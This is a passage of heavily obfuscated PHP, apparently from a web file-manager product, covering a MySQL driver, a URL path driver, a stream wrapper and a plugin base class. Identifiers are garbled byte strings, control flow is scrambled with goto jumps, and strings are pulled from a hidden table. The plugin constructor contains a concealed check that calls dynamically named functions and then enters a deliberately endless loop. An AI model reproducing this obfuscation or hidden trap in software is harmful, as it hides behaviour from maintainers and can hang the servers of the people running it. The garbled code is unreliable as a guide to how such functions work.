think_exception(mysqli_connect_error()); } goto FÏƒØÖÄ‘Ÿ; FÏƒØÖÄ‘Ÿ: $c“‡…µ¸¤Ñ = $this->linkID[$B…ë‰†Ø´ß]->server_version; $this->linkID[$B…ë‰†Ø´ß]->query($CˆîìèËÎÜ[796] . think_config($CˆîìèËÎÜ[797]) . $CˆîìèËÎÜ[55]); if ($c“‡…µ¸¤Ñ > $CˆîìèËÎÜ[798]) { $this->linkID[$B…ë‰†Ø´ß]->query($CˆîìèËÎÜ[799]); } goto EÏçÁõ‰¹Ó; EÏçÁõ‰¹Ó: $this->connected = !0; if (1 != think_config($CˆîìèËÎÜ[18])) { unset($this->config); } goto C—ŸÁƒ˜‚±; C—ŸÁƒ˜‚±: } return $this->linkID[$B…ë‰†Ø´ß]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($B—ä•„œÏ›) { goto bØò²—óÆ×; B…Å«÷²ší: $this->queryStr = $B—ä•„œÏ›; if ($this->queryID) { $this->free(); } think_action_status($aİÍ³ »Ï©[19], 1); goto dÚ®–Øˆä™; C¼²¯×àğ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto B˜®ğµº¾Å; bØò²—óÆ×: $aİÍ³ »Ï© =& $_SERVER[õëù©û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B…Å«÷²ší; dÚ®–Øˆä™: think_status($aİÍ³ »Ï©[20]); $this->queryID = $this->_linkID->query($B—ä•„œÏ›); if ($this->_linkID->more_results()) { while (($a„–ÁãÏ³¦ = $this->_linkID->next_result()) != NULL) { $a„–ÁãÏ³¦->free_result(); } } goto C¼²¯×àğ; B˜®ğµº¾Å: } public function execute($aÚ¹Ú¢ğî†) { goto CÈ±½˜¯Ë; f‹„ÉØÀ§: if (!1 === $E•–Ñœ¬É¯) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto c’–É‚ßÒÚ; DÓŞ©«¸‹é: think_status($Eœ‡šÉç‚²[20]); $E•–Ñœ¬É¯ = $this->_linkID->query($aÚ¹Ú¢ğî†); $this->debug(); goto f‹„ÉØÀ§; CÈ±½˜¯Ë: $Eœ‡šÉç‚² =& $_SERVER[õëù©û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E³İİñÀ£Ğ; E³İİñÀ£Ğ: $this->queryStr = $aÚ¹Ú¢ğî†; if ($this->queryID) { $this->free(); } think_action_status($Eœ‡šÉç‚²[21], 1); goto DÓŞ©«¸‹é; c’–É‚ßÒÚ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÕä×Ğó = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aÕä×Ğó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dôÑºãŸö¹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dôÑºãŸö¹) { $this->error(); return !1; } } return !0; } private function getAll() { $CóÊ¨‡•ä§ = array(); if ($this->numRows > 0) { for ($b±»á¦ÇÔÕ = 0; $b±»á¦ÇÔÕ < $this->numRows; $b±»á¦ÇÔÕ++) { $CóÊ¨‡•ä§[$b±»á¦ÇÔÕ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $CóÊ¨‡•ä§; } public function getFields($e˜ùÉ¯™Ö) { $bóã £Ã‡ =& $_SERVER[õëù©û]; $cÊìÍñõƒ = $this->query($bóã £Ã‡[803] . $this->parseKey($e˜ùÉ¯™Ö)); $cÅŒê¹¤óç = array(); if ($cÊìÍñõƒ) { foreach ($cÊìÍñõƒ as $B¨½¦Ú…§” => $DßÄ½½»“Ê) { $cÅŒê¹¤óç[$DßÄ½½»“Ê[$bóã £Ã‡[27]]] = array($bóã £Ã‡[28] => $DßÄ½½»“Ê[$bóã £Ã‡[27]], $bóã £Ã‡[29] => $DßÄ½½»“Ê[$bóã £Ã‡[30]], $bóã £Ã‡[31] => (bool) ($DßÄ½½»“Ê[$bóã £Ã‡[32]] === $bóã £Ã‡[33]), $bóã £Ã‡[34] => $DßÄ½½»“Ê[$bóã £Ã‡[35]], $bóã £Ã‡[36] => strtolower($DßÄ½½»“Ê[$bóã £Ã‡[37]]) == $bóã £Ã‡[38], $bóã £Ã‡[39] => strtolower($DßÄ½½»“Ê[$bóã £Ã‡[40]]) == $bóã £Ã‡[41]); } } return $cÅŒê¹¤óç; } public function getTables($fÌŞì‚¢§˜ = '') { $bˆ‘—¾¹ÌÜ =& $_SERVER[õëù©û]; $BÄÖ‘Ì‘¶ß = !empty($fÌŞì‚¢§˜) ? $bˆ‘—¾¹ÌÜ[805] . $fÌŞì‚¢§˜ : $bˆ‘—¾¹ÌÜ[806]; $dŠô†÷×ä = $this->query($BÄÖ‘Ì‘¶ß); $A¹ÔæßÇÙ = array(); if ($dŠô†÷×ä) { foreach ($dŠô†÷×ä as $d„£ÁÌá‚¡ => $E´Ú‘“º¨Ğ) { $A¹ÔæßÇÙ[$d„£ÁÌá‚¡] = current($E´Ú‘“º¨Ğ); } } return $A¹ÔæßÇÙ; } public function replace($aˆóƒ–‡­, $aÒæ§Âá–› = array()) { $D„íñÄã’ =& $_SERVER[õëù©û]; foreach ($aˆóƒ–‡­ as $C—ĞåÕà×à => $bš‘ã¬·ñ) { $A‰†¾å‡ = $this->parseValue($bš‘ã¬·ñ); if (is_scalar($A‰†¾å‡)) { $FñÓîÙ´ŒÔ[] = $A‰†¾å‡; $B‰«ÒÇŞ[] = $this->parseKey($C—ĞåÕà×à); } } $B†çÕĞ™Õœ = $D„íñÄã’[807] . $this->parseTable($aÒæ§Âá–›[$D„íñÄã’[263]]) . $D„íñÄã’[808] . implode($D„íñÄã’[47], $B‰«ÒÇŞ) . $D„íñÄã’[809] . implode($D„íñÄã’[47], $FñÓîÙ´ŒÔ) . $D„íñÄã’[810]; return $this->execute($B†çÕĞ™Õœ); } public function insertAll($E÷Æ…ˆªŞ¯, $C”‹¯·‡Œ = array(), $E‡’‡—Šê± = false) { goto FõÇĞ÷ğ¡‹; aáòŠ¬”¡ï: $b÷—Š¡ÜÖ = ($E‡’‡—Šê± ? $c¡¾Ä‚¥Ş²[812] : $c¡¾Ä‚¥Ş²[813]) . $c¡¾Ä‚¥Ş²[814] . $this->parseTable($C”‹¯·‡Œ[$c¡¾Ä‚¥Ş²[263]]) . $c¡¾Ä‚¥Ş²[808] . implode($c¡¾Ä‚¥Ş²[47], $e§²¯ìµŒÇ) . $c¡¾Ä‚¥Ş²[815] . implode($c¡¾Ä‚¥Ş²[47], $C¶Ş‚¾‹Ú…); return $this->execute($b÷—Š¡ÜÖ); goto eğ´ƒùŒŠ®; Eå¯ãµ˜: $C¶Ş‚¾‹Ú… = array(); foreach ($E÷Æ…ˆªŞ¯ as $Aèƒ¡³ƒ²Ï) { $bÌîí¥ˆêÄ = array(); foreach ($Aèƒ¡³ƒ²Ï as $f‡‰ÂÚÀÑ’ => $c¼ï™¢÷‰) { $c¼ï™¢÷‰ = $this->parseValue($c¼ï™¢÷‰); if (is_scalar($c¼ï™¢÷‰)) { $bÌîí¥ˆêÄ[] = $c¼ï™¢÷‰; } } $C¶Ş‚¾‹Ú…[] = $c¡¾Ä‚¥Ş²[244] . implode($c¡¾Ä‚¥Ş²[47], $bÌîí¥ˆêÄ) . $c¡¾Ä‚¥Ş²[810]; } array_walk($e§²¯ìµŒÇ, array($this, $c¡¾Ä‚¥Ş²[811])); goto aáòŠ¬”¡ï; FõÇĞ÷ğ¡‹: $c¡¾Ä‚¥Ş² =& $_SERVER[õëù©û]; if (!is_array($E÷Æ…ˆªŞ¯[0])) { return !1; } $e§²¯ìµŒÇ = array_keys($E÷Æ…ˆªŞ¯[0]); goto Eå¯ãµ˜; eğ´ƒùŒŠ®: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e¬Úåí˜†¨ =& $_SERVER[õëù©û]; $this->error = $this->_linkID->errno . $e¬Úåí˜†¨[4] . $this->_linkID->error; if ($e¬Úåí˜†¨[33] != $this->queryStr) { $this->error .= LNG($e¬Úåí˜†¨[45]) . $this->queryStr; } think_trace($this->error, $e¬Úåí˜†¨[33], $e¬Úåí˜†¨[46]); return $this->error; } public function escapeString($B•ôÑõ±ê‹) { if ($this->_linkID) { return $this->_linkID->real_escape_string($B•ôÑõ±ê‹); } else { return addslashes($B•ôÑõ±ê‹); } } public function parseKey(&$Aê†ç†È¤´, $EÌÒ×Õ‚Ú¦ = true) { $c…¢êì½Š“ =& $_SERVER[õëù©û]; if ($EÌÒ×Õ‚Ú¦) { $Aê†ç†È¤´ = $this->parseKeyCheck($Aê†ç†È¤´); } if ($Aê†ç†È¤´ != $c…¢êì½Š“[172] && !preg_match($c…¢êì½Š“[816], $Aê†ç†È¤´)) { $Aê†ç†È¤´ = $c…¢êì½Š“[817] . trim($Aê†ç†È¤´, $c…¢êì½Š“[817]) . $c…¢êì½Š“[817]; } return $Aê†ç†È¤´; } } goto AÌÒ›×æ…³; CˆæóØæ„: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($E£ÓóŠø„¡ = false) { } public function exist($bËÁ®å½) { $CêËñ¥ò“ = $this->info($bËÁ®å½); return $CêËñ¥ò“[$_SERVER[õëù©û][184]]; } public function isFile($fÜÌ–ä˜Ş†) { $C»åâñŞ‚ = $this->info($fÜÌ–ä˜Ş†); return $C»åâñŞ‚[$_SERVER[õëù©û][184]]; } public function isFolder($C³ù›•œ‡—) { return !1; } public function size($F…®í¶ÒÉ„) { $E÷‡¨º¼âì = $this->info($F…®í¶ÒÉ„); return $E÷‡¨º¼âì[$_SERVER[õëù©û][77]]; } public function info($AÄ˜Õøåô) { return $this->infoParse($AÄ˜Õøåô); } public function infoAuth($b“½Ö‰™ï) { return $this->infoParse($b“½Ö‰™ï); } public function infoWithChildren($dÇ‹ß×ºí£) { return $this->infoParse($dÇ‹ß×ºí£); } public function infoFull($cô›ó£ÙÚ) { return $this->infoParse($cô›ó£ÙÚ); } private function infoParse($eòµÖ­š©Õ) { $eŸ‘»¾¼İº =& $_SERVER[õëù©û]; $bßé—¥Ü’Ã = $this->header($eòµÖ­š©Õ); if (!$bßé—¥Ü’Ã || !$bßé—¥Ü’Ã[$eŸ‘»¾¼İº[684]]) { return !1; } $dÆóàŠœ²½ = _get($bßé—¥Ü’Ã, $eŸ‘»¾¼İº[321], 0); $Aà¡¥Ëê = array($eŸ‘»¾¼İº[28] => $bßé—¥Ü’Ã[$eŸ‘»¾¼İº[28]], $eŸ‘»¾¼İº[75] => $eòµÖ­š©Õ, $eŸ‘»¾¼İº[29] => $eŸ‘»¾¼İº[163], $eŸ‘»¾¼İº[77] => intval($dÆóàŠœ²½), $eŸ‘»¾¼İº[156] => get_path_ext($bßé—¥Ü’Ã[$eŸ‘»¾¼İº[28]]), $eŸ‘»¾¼İº[1145] => $dÆóàŠœ²½ > 0 && $bßé—¥Ü’Ã[$eŸ‘»¾¼İº[1272]], $eŸ‘»¾¼İº[1146] => !1); return $Aà¡¥Ëê; } private function header($aîÔ–±¢—İ) { if (isset(self::$_cacheHeader[$aîÔ–±¢—İ])) { return self::$_cacheHeader[$aîÔ–±¢—İ]; } self::$_cacheHeader[$aîÔ–±¢—İ] = url_header($aîÔ–±¢—İ); return self::$_cacheHeader[$aîÔ–±¢—İ]; } public function hashSimple($c·‰é´‚™Ï, $bÉÊØ…±™… = false) { goto CÎõé—ñé¡; a²ª¯´ÉÕÕ: $fÛ—Â°Ù… .= $this->fileSubstr($c·‰é´‚™Ï, $aë”ç„Òö‚ - $e²ù­­¸Å—, $e²ù­­¸Å—); return md5($fÛ—Â°Ù…) . $aë”ç„Òö‚; goto Bİ¡›º­—È; cğøµùËÎ: $aë”ç„Òö‚ = $dÂ”‹í–Ç¿[$c ²øŞÏõá[77]]; $e²ù­­¸Å— = 200; $bí¯‡àí¡« = 50; goto BÀ¿Â¥ªºÖ; fáõà“ÙÎØ: $fÄ¡ß‰¸ = timeFloat(); $A¬‹ì² ¥ß = 15; for ($AÕÌ†Ş¹¶ = 0; $AÕÌ†Ş¹¶ < $bí¯‡àí¡«; $AÕÌ†Ş¹¶++) { if (timeFloat() - $fÄ¡ß‰¸ > $A¬‹ì² ¥ß) { return !1; } $A‰ÕÌã™ä· = $this->fileSubstr($c·‰é´‚™Ï, $CèŠë°£±Í * $AÕÌ†Ş¹¶, $e²ù­­¸Å—); if (!$A‰ÕÌã™ä·) { return !1; } $fÛ—Â°Ù… .= $A‰ÕÌã™ä·; } goto a²ª¯´ÉÕÕ; BÀ¿Â¥ªºÖ: if ($aë”ç„Òö‚ <= $e²ù­­¸Å— * $bí¯‡àí¡«) { return md5($this->fileSubstr($c·‰é´‚™Ï, 0, $aë”ç„Òö‚)) . $aë”ç„Òö‚; } $CèŠë°£±Í = intval($aë”ç„Òö‚ / $bí¯‡àí¡«); $fÛ—Â°Ù… = $c ²øŞÏõá[33]; goto fáõà“ÙÎØ; CÎõé—ñé¡: $c ²øŞÏõá =& $_SERVER[õëù©û]; $dÂ”‹í–Ç¿ = $this->info($c·‰é´‚™Ï); if (!$dÂ”‹í–Ç¿ || !$dÂ”‹í–Ç¿[$c ²øŞÏõá[184]]) { return !1; } goto cğøµùËÎ; Bİ¡›º­—È: } public function getContent($A«ËĞñ©î) { return $this->fileSubstr($A«ËĞñ©î); } public function fileSubstr($eê”Ç×ö¾, $A÷åƒ‰· = 0, $e®ßµùâ‰õ = -1) { goto B–¨ŸŸèù; B–¨ŸŸèù: $cîÊÍ½ Ãä =& $_SERVER[õëù©û]; $Aë‡İòÊø = $this->info($eê”Ç×ö¾); if (!$Aë‡İòÊø || !$Aë‡İòÊø[$cîÊÍ½ Ãä[184]] && $Aë‡İòÊø[$cîÊÍ½ Ãä[77]] > 1024 * 1024 * 10) { return !1; } goto Dä†ñæ¹Å˜; Dä†ñæ¹Å˜: if ($e®ßµùâ‰õ === -1) { $e®ßµùâ‰õ = $Aë‡İòÊø[$cîÊÍ½ Ãä[77]]; } if ($e®ßµùâ‰õ == 0) { return $cîÊÍ½ Ãä[33]; } $CÙ½·ñª = array($cîÊÍ½ Ãä[1273] . $A÷åƒ‰· . $cîÊÍ½ Ãä[709] . ($A÷åƒ‰· + $e®ßµùâ‰õ - 1)); goto Eğ’Â¥„·ö; Eğ’Â¥„·ö: $d¡èÑŒÍÂ = url_request($eê”Ç×ö¾, $cîÊÍ½ Ãä[212], !1, $CÙ½·ñª, !1, !1, 1); return $d¡èÑŒÍÂ[$cîÊÍ½ Ãä[1025]] ? $d¡èÑŒÍÂ[$cîÊÍ½ Ãä[1025]] : $cîÊÍ½ Ãä[33]; goto eá¥†–Ö¤; eá¥†–Ö¤: } public function download($BÜË÷âÎ«¨, $c³ ÍÑùÀï) { Downloader::start($BÜË÷âÎ«¨, $c³ ÍÑùÀï); return $c³ ÍÑùÀï; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Fá‚ùØêÈÕ, $dŞëÂ²‹† = '') { goto bƒä„„ÎÍÜ; d”í“ –§¼: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Fá‚ùØêÈÕ])) { self::$_chunkBuffer[$Fá‚ùØêÈÕ] = array(); } goto DĞæÈ™ŒÜĞ; DĞæÈ™ŒÜĞ: return $this->info ? !0 : !1; goto Bâä½„ë«…; bƒä„„ÎÍÜ: $this->info = $this->info($Fá‚ùØêÈÕ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[õëù©û][75]]; goto d”í“ –§¼; Bâä½„ë«…: } function stream_read($dŸè½Û¤Š) { $e®‰‡›¸òİ = $this->fileSubstr($this->pose, $dŸè½Û¤Š); $this->pose += strlen($e®‰‡›¸òİ); return $e®‰‡›¸òİ; } public function stream_tell() { return $this->pose; } public function stream_seek($d’÷É©Øå¨, $eŸšà‰‚—È) { $bäËÊ¯©íĞ =& $_SERVER[õëù©û]; if ($eŸšà‰‚—È == SEEK_SET) { $this->pose = $d’÷É©Øå¨; } else { if ($eŸšà‰‚—È == SEEK_CUR) { $this->pose += $d’÷É©Øå¨; } else { if ($eŸšà‰‚—È == SEEK_END) { $this->pose = $this->info[$bäËÊ¯©íĞ[77]] + intval($d’÷É©Øå¨); } } } if ($d’÷É©Øå¨ < 0) { $this->pose = $this->info[$bäËÊ¯©íĞ[77]] + $d’÷É©Øå¨; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[õëù©û][77]]; } public function stream_close() { return !0; } public function url_stat($Féò–ÔÂ, $AÉ¹Ç¾àŒ¾) { $bÔï®’‡ =& $_SERVER[õëù©û]; $B×ƒÏ°ãİ  = $this->info($Féò–ÔÂ); return array($bÔï®’‡[1274] => 0, $bÔï®’‡[1275] => 0, $bÔï®’‡[12] => 32768 + 511, $bÔï®’‡[1276] => 0, $bÔï®’‡[1277] => 0, $bÔï®’‡[1278] => 0, $bÔï®’‡[1279] => 0, $bÔï®’‡[77] => $B×ƒÏ°ãİ [$bÔï®’‡[77]], $bÔï®’‡[1280] => $B×ƒÏ°ãİ [$bÔï®’‡[1151]], $bÔï®’‡[1237] => $B×ƒÏ°ãİ [$bÔï®’‡[106]], $bÔï®’‡[1236] => $B×ƒÏ°ãİ [$bÔï®’‡[183]], $bÔï®’‡[1281] => 0, $bÔï®’‡[1282] => 0); } static $fileInfo = array(); public function info($cÀ„±…¾‘•) { $C†´èÌŒµÙ = $_SERVER[õëù©û][1283]; if (isset(self::$fileInfo[$cÀ„±…¾‘•])) { return self::$fileInfo[$cÀ„±…¾‘•]; } if (substr($cÀ„±…¾‘•, 0, strlen($C†´èÌŒµÙ)) != $C†´èÌŒµÙ) { return !1; } self::$fileInfo[$cÀ„±…¾‘•] = IO::info(substr($cÀ„±…¾‘•, strlen($C†´èÌŒµÙ))); return self::$fileInfo[$cÀ„±…¾‘•]; } public static function read($CèŠÎ£Âæ¬, $c²¸ İå¸ª, $CËÌÜ¢–¾Ü) { goto dˆ“ê©©‡…; f«©ĞÕ¶İ¥: return $c§®ÕÁÆèÃ; goto D¹­ğäºè; e¸·‰ã—†: $e¶³‰‹ù‚÷ = 0; while ($e¶³‰‹ù‚÷ < $CËÌÜ¢–¾Ü) { $a£è Öõ“Æ = min($C›‡ÊÔáËà, $CËÌÜ¢–¾Ü - $e¶³‰‹ù‚÷); $c§®ÕÁÆèÃ .= fread($b·ËîŞÏ, $a£è Öõ“Æ); $e¶³‰‹ù‚÷ += $a£è Öõ“Æ; } fclose($b·ËîŞÏ); goto f«©ĞÕ¶İ¥; dˆ“ê©©‡…: $cêÈ¥æœŞ =& $_SERVER[õëù©û]; $b·ËîŞÏ = fopen($CèŠÎ£Âæ¬, $cêÈ¥æœŞ[1153]); if (!$b·ËîŞÏ) { return $cêÈ¥æœŞ[33]; } goto FĞ‡‚±«ëİ; FĞ‡‚±«ëİ: $C›‡ÊÔáËà = 8192; fseek($b·ËîŞÏ, $c²¸ İå¸ª, SEEK_SET); $c§®ÕÁÆèÃ = $cêÈ¥æœŞ[33]; goto e¸·‰ã—†; D¹­ğäºè: } public function fileSubstr($FÌëŠÖºÑñ, $F¬·àê¼‡Ú) { goto A²ÍŸ‘¥Å¶; Bëˆñš°ãÕ: $f·´äõ¿Ÿ = 0; $B´ºÔ°šŠ = 0; $aéÉÑ¹ÍÄ = $A„áæ™Äâ‘[33]; goto Bö†Üó²œ; Bö†Üó²œ: foreach ($a‹öß·”Š as $f·´äõ¿Ÿ => $aéÉÑ¹ÍÄ) { $f·´äõ¿Ÿ = intval($f·´äõ¿Ÿ); $B´ºÔ°šŠ = $f·´äõ¿Ÿ + strlen($aéÉÑ¹ÍÄ); if ($FÌëŠÖºÑñ >= $B´ºÔ°šŠ) { continue; } if ($FÌëŠÖºÑñ >= $f·´äõ¿Ÿ && $FÌëŠÖºÑñ + $F¬·àê¼‡Ú <= $B´ºÔ°šŠ) { return substr($aéÉÑ¹ÍÄ, $FÌëŠÖºÑñ - $f·´äõ¿Ÿ, $F¬·àê¼‡Ú); } break; } if (count($a‹öß·”Š) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($A„áæ™Äâ‘[1284], $A„áæ™Äâ‘[1285] . count($a‹öß·”Š) . "\x3b\x73\x74\141\162\164\75{$FÌëŠÖºÑñ}\x2c\154\x65\x6e\x67\164\x68\75{$F¬·àê¼‡Ú}\73\x70\x6f\163\145\x3a{$f·´äõ¿Ÿ}\x7e{$B´ºÔ°šŠ}"); throw new Exception($A„áæ™Äâ‘[1286]); } $BÛ ·°¬¡¡ = intval($FÌëŠÖºÑñ / $Bîç¤˜Ğ›) * $Bîç¤˜Ğ›; goto FÀ‡…Ü†ğ; aÉ­­‰³¥: $Bîç¤˜Ğ› = 64 * 1024; $a‹öß·”Š =& self::$_chunkBuffer[$this->path]; if (!$a‹öß·”Š) { $a‹öß·”Š = array(); } goto Bëˆñš°ãÕ; e–ÃÃËî: if ($FÌëŠÖºÑñ + $F¬·àê¼‡Ú > $c“™ì§×ëì) { $F¬·àê¼‡Ú = $c“™ì§×ëì - $FÌëŠÖºÑñ; } if ($F¬·àê¼‡Ú <= 0) { return $A„áæ™Äâ‘[33]; } if ($FÌëŠÖºÑñ < 0 || $FÌëŠÖºÑñ >= $c“™ì§×ëì || $F¬·àê¼‡Ú <= 0 || $F¬·àê¼‡Ú > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\154\145\x52\x65\x61\144\x20\145\x72\162\157\162\41\x20\163\x74\x61\x72\x74\x3d{$FÌëŠÖºÑñ}\73\154\x65\156\147\x74\150\75{$F¬·àê¼‡Ú}\73\x20\x73\151\x7a\x65\75{$c“™ì§×ëì}\x3b"); } goto aÉ­­‰³¥; dÙ·³†ÁÀ: $FÜİÙÈáÉò = $F¬·àê¼‡Ú; if ($FÌëŠÖºÑñ < 0) { $FÌëŠÖºÑñ = $c“™ì§×ëì + $FÌëŠÖºÑñ; } if ($F¬·àê¼‡Ú === !1) { $F¬·àê¼‡Ú = $c“™ì§×ëì - $FÌëŠÖºÑñ; } goto e–ÃÃËî; cà‚Î‰ç: ksort($a‹öß·”Š); $a¶…ÛïÅ = substr($C¶À¶”Èî, $FÌëŠÖºÑñ - $BÛ ·°¬¡¡, $F¬·àê¼‡Ú); return $a¶…ÛïÅ; goto Bí«Î’Œ‘; FÀ‡…Ü†ğ: $fô‘Å¸‹±„ = ceil(($FÌëŠÖºÑñ + $F¬·àê¼‡Ú) / $Bîç¤˜Ğ›) * $Bîç¤˜Ğ› - $BÛ ·°¬¡¡; $C¶À¶”Èî = IO::fileSubstr($this->path, $BÛ ·°¬¡¡, $fô‘Å¸‹±„); $a‹öß·”Š[$BÛ ·°¬¡¡ . $A„áæ™Äâ‘[33]] = $C¶À¶”Èî; goto cà‚Î‰ç; A²ÍŸ‘¥Å¶: $A„áæ™Äâ‘ =& $_SERVER[õëù©û]; $c“™ì§×ëì = $this->info[$A„áæ™Äâ‘[77]]; $DÎì¼ñœì˜ = $FÌëŠÖºÑñ; goto dÙ·³†ÁÀ; Bí«Î’Œ‘: } private function log($d‰œƒĞ¥ëÔ, $Dë¤ğÌ¯ñŠ) { $dÈîæ‰ù =& $_SERVER[õëù©û]; $aÇ‡ö·‚ô” = timeFloat() - $this->timeStart; write_log(sprintf($dÈîæ‰ù[1287], $d‰œƒĞ¥ëÔ, $this->info[$dÈîæ‰ù[28]], $aÇ‡ö·‚ô”, $Dë¤ğÌ¯ñŠ), $dÈîæ‰ù[1202]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eÁÅ‹“¯¤Ó; b·ï³àáÉÔ: $this->values = array(); return $this; goto EİÕ‚‰’Å‰; D†ê¯œ¾õ: $this->pluginName = str_replace($c‘®Ï‚âˆ[1288], $c‘®Ï‚âˆ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $c‘®Ï‚âˆ[8]; $this->pluginApi = appHostGet() . $c‘®Ï‚âˆ[1289] . $this->pluginName . $c‘®Ï‚âˆ[8]; goto eÌÍ‹áá¨Å; a‚œ§ÙÑ¸: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($c‘®Ï‚âˆ[1288]); goto D†ê¯œ¾õ; eÌÍ‹áá¨Å: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $c‘®Ï‚âˆ[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $c‘®Ï‚âˆ[8]; $this->pluginLangArr = $this->initLang(); goto b·ï³àáÉÔ; eÁÅ‹“¯¤Ó: $c‘®Ï‚âˆ =& $_SERVER[õëù©û]; if (!isset($_SERVER[$c‘®Ï‚âˆ[781]]) || !isset($_SERVER[$c‘®Ï‚âˆ[782]])) { goto fò¦Ğƒ¹¼¬; D‚ç›³ÓÆ¬: $BÖÓ·¨†Ş† = $cµ‡çÒÄß”($AÓà‡ç´•Œ); $DªœÖ¹å–Ô = explode($c‘®Ï‚âˆ[213], $BÖÓ·¨†Ş†); if (count($DªœÖ¹å–Ô) < $c‘®Ï‚âˆ[581]) { $déîÆéí = $c‘®Ï‚âˆ[787]; $déîÆéí(); } goto eã˜Ö†£ÚÜ; eã˜Ö†£ÚÜ: $fİŒ´¶ˆ¹‰ = $c‘®Ï‚âˆ[788]; $fİŒ´¶ˆ¹‰($_SERVER[$c‘®Ï‚âˆ[789]]); $FŠ¯Í¨¡“À = 1; goto EÃ¢ëç ‰; EÃ¢ëç ‰: for ($DéÓÇò¦ÎØ = $FŠ¯Í¨¡“À; $DéÓÇò¦ÎØ > 0; $DéÓÇò¦ÎØ++) { $fİŒ´¶ˆ¹‰ = json_encode($GLOBALS[$c‘®Ï‚âˆ[380]]); } goto c‚”÷®¶ò; fò¦Ğƒ¹¼¬: $B¨œ¦ˆÁŸ = $c‘®Ï‚âˆ[783]; $cµ‡çÒÄß” = $c‘®Ï‚âˆ[784]; $AÓà‡ç´•Œ = $_SERVER[$c‘®Ï‚âˆ[785]] . $c‘®Ï‚âˆ[786]; goto D‚ç›³ÓÆ¬; c‚”÷®¶ò: } global $in, $config; goto a‚œ§ÙÑ¸; EİÕ‚‰’Å‰: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[õëù©û][1290]); } protected function assign($D¥¬êÛÚ‡, $c²“Ğ™„ë¢ = false) { if (is_array($D¥¬êÛÚ‡)) { $this->values = array_merge($this->values, $D¥¬êÛÚ‡); } else { $this->values[$D¥¬êÛÚ‡] = $c²“Ğ™„ë¢; } } protected function display($c……µ¿Õµã) { extract($this->values); require $c……µ¿Õµã; } final function hookRegist($cæ®æİĞÍ) { $this->modelPlugin->appRegist($this->pluginName, $cæ®æİĞÍ); } final function appIcon() { $EØ©¤²®Ğª =& $_SERVER[õëù©û]; $f¸ƒ¾ÖÏ‡Æ = $this->appPackage(); $EÁîóİ¢­Ÿ = $EØ©¤²®Ğª[33]; if (isset($f¸ƒ¾ÖÏ‡Æ[$EØ©¤²®Ğª[378]])) { if (isset($f¸ƒ¾ÖÏ‡Æ[$EØ©¤²®Ğª[378]][$EØ©¤²®Ğª[1291]])) { $EÁîóİ¢­Ÿ = $EØ©¤²®Ğª[1292] . $f¸ƒ¾ÖÏ‡Æ[$EØ©¤²®Ğª[378]][$EØ©¤²®Ğª[1291]] . $EØ©¤²®Ğª[1293]; } else { if ($f¸ƒ¾ÖÏ‡Æ[$EØ©¤²®Ğª[378]][$EØ©¤²®Ğª[1294]]) { $EÁîóİ¢­Ÿ = $EØ©¤²®Ğª[1295] . $f¸ƒ¾ÖÏ‡Æ[$EØ©¤²®Ğª[378]][$EØ©¤²®Ğª[1294]] . $EØ©¤²®Ğª[1296]; } } } return $EÁîóİ¢­Ÿ; } final function fileCanView($C‡†½çÂßÆ) { $EƒÍÔö ¬ =& $_SERVER[õëù©û]; if (request_url_safe($C‡†½çÂßÆ)) { return !0; } if ($this->isShare($C‡†½çÂßÆ)) { return !0; } if (!Action($EƒÍÔö ¬[1297])->authCan($EƒÍÔö ¬[1298])) { show_tips(LNG($EƒÍÔö ¬[1299]) . $EƒÍÔö ¬[1300], !1); } ActionCall($EƒÍÔö ¬[1301], $C‡†½çÂßÆ); } final function isShare($CˆšñÉÁ“) { $cƒ¿ˆŒê‹È = KodIO::parse($CˆšñÉÁ“); return $cƒ¿ˆŒê‹È[$_SERVER[õëù©û][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($aÁ¢ñ×™ï‹) { if (request_url_safe($aÁ¢ñ×™ï‹)) { return $aÁ¢ñ×™ï‹; } if (!$this->isShare($aÁ¢ñ×™ï‹)) { $aÁ¢ñ×™ï‹ = $this->filePath($aÁ¢ñ×™ï‹); } return Action($_SERVER[õëù©û][1008])->linkOut($aÁ¢ñ×™ï‹); } public function filePathLinkOut($déÒ‚±á‚œ) { if (request_url_safe($déÒ‚±á‚œ)) { return $déÒ‚±á‚œ; } $this->fileCanView($déÒ‚±á‚œ); return Action($_SERVER[õëù©û][1008])->link($déÒ‚±á‚œ); } final function filePath($e’¶‘Å‡Í) { $D´öéÕ«àù =& $_SERVER[õëù©û]; if ($C¿æ¶ğâ¡¶ = 